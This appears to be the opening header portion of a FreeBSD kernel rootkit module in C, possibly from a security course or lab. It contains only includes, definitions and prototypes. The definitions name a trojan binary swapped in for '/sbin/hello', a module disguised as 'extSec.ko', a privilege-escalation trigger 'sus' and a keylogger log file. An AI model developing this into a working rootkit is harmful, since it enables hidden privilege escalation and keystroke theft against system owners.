#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/stat.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/dirent.h>
#include <sys/file.h>
#include <sys/uio.h>
#include <sys/ucred.h>
#include <sys/resourcevar.h>
#include <sys/pcpu.h>
#include <sys/syscallsubr.h>
#include <sys/fcntl.h>
#include <sys/namei.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#define ORIGINAL	"/sbin/hello"
#define TROJAN		"/sbin/trojan_hello"
#define T_NAME		"trojan_hello"
#define VERSION		"extSec.ko"
#define ESCALATE_NAME	"sus"
#define KEYLOGGER_FILE	"/i_am_watching_you.txt"

int load(struct module *, int, void *);

void escalate(struct thread *);

void unload(void);
